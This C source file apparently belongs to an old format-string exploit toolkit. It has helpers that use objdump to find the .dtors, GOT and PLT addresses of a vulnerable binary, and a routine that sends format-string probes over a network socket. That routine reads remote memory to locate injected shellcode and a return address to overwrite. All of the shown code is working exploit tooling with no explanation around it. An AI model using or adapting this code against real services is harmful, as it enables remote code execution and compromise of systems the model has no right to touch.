/*
 * Copyright (C) 2001, 2002 Pappy.
 * Copyright (C) 2001, 2002 Zorgon.
 * All rights reserved.
 * 
 */

#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include "fmtb.h"

/* get_dtors
 * taken from fmtxp.c made by scut (cf. formatstring-1.2.tar.gz )
 * but ported to compute the address of the .dtors section in the 
 * vulnerable program.
 */
unsigned long get_dtors( char * path )
{
  FILE * pipe;
  char pbuf[512];
  unsigned long dtors;

  memset( pbuf, '\x00', sizeof(pbuf) );
  snprintf(pbuf, sizeof(pbuf), "%s -s -j .dtors %s | grep ffffffff | cut -d ' ' -f 2", OBJDUMP, path );
  pbuf[sizeof(pbuf)-1] = '\x00';
	
  pipe = popen( pbuf, "r" );
  if ( pipe == NULL ) {
    return( 0 );
  }

  if ( fscanf(pipe, "%08lx", &dtors) != 1 ) {
    return( 0 );
  }

  if ( pclose(pipe) ){
    return( 0 );
  }

  dtors = dtors + 4;
  return( dtors );
}	

/* get_got
 * clone of get_dtors
 */
unsigned long get_got( char * path, char * function )
{
  FILE * pipe;
  char pbuf[512];
  unsigned long got;

  memset( pbuf, '\x00', sizeof(pbuf) );
  snprintf(pbuf, sizeof(pbuf), "%s -R %s | grep %s | cut -d ' ' -f 1", OBJDUMP, path, function );
  pbuf[sizeof(pbuf)-1] = '\x00';

  pipe = popen( pbuf, "r" );
  if ( pipe == NULL ) {
    return( 0 );
  }

  if ( fscanf(pipe, "%08lx", &got) != 1 ) {
    return( 0 );
  }

  if ( pclose(pipe) ){
    return( 0 );
  }
  return( got );
}


/* get_plt
 * clone of get_dtors
 */
unsigned long get_plt( char * path, char * function )
{
  FILE * pipe;
  char pbuf[512];
  unsigned long plt;

  memset( pbuf, '\x00', sizeof(pbuf) );
  snprintf(pbuf, sizeof(pbuf), "%s -T %s | grep %s | cut -d ' ' -f 1", OBJDUMP, path, function );
  pbuf[sizeof(pbuf)-1] = '\x00';

  pipe = popen( pbuf, "r" );
  if ( pipe == NULL ) {
    return( 0 );
  }

  if ( fscanf(pipe, "%08lx", &plt) != 1 ) {
    return( 0 );
  }

  if ( pclose(pipe) ){
    return( 0 );
  }
	
  return( plt );
}

void get_addr_remote ( int sock, string_t * p_string, char * shellcode, size_t read_at )
{
  char * ptr;
  char fmt[128], string_out[1024];
  size_t addr_shellcode = -1;
  size_t addr_buffer = -1;
  size_t addr_ret = -1;
  int len, i;

  memset( fmt, '\x00', sizeof(fmt) );
  get_addr_as_char( read_at, fmt );

  snprintf( fmt+4, sizeof(fmt)-4, "%%%d$s", p_string->offset );
  write( sock, fmt, strlen(fmt) );
  sleep( 5 );

  while ( (len = read(sock, string_out, sizeof(string_out))) > 0 && (addr_shellcode == -1 || addr_buffer == -1 || addr_ret == -1) ) {
		
    /* the shellcode */
    if ( (ptr = strstr(string_out, shellcode)) != NULL ) {
      addr_shellcode = read_at + ( ptr - string_out ) - 4;
    }

    /* the input buffer */
    if ( (ptr = strstr(string_out, fmt)) ) {
      addr_buffer = read_at + ( ptr - string_out ) - 4;
    }

    /* return address */
    if ( addr_buffer != -1 ) {
      i = 4;
      while ( i<len-5 && addr_ret == -1 ) {
	if ( string_out[i] == (char)0xff && string_out[i+1] == (char)0xbf && string_out[i+4] == (char)0x04 && string_out[i+5] == (char)0x08 ) {
	  addr_ret = read_at + i - 2 + 4 - 4;
	}
	i++;
      }
    }
    read_at += ( len - 4 + 1 );
    get_addr_as_char( read_at, fmt );
    write( sock, fmt, strlen(fmt) );
  }

  p_string->locaddr = addr_ret;
  p_string->retaddr = addr_shellcode; 
  return;
}
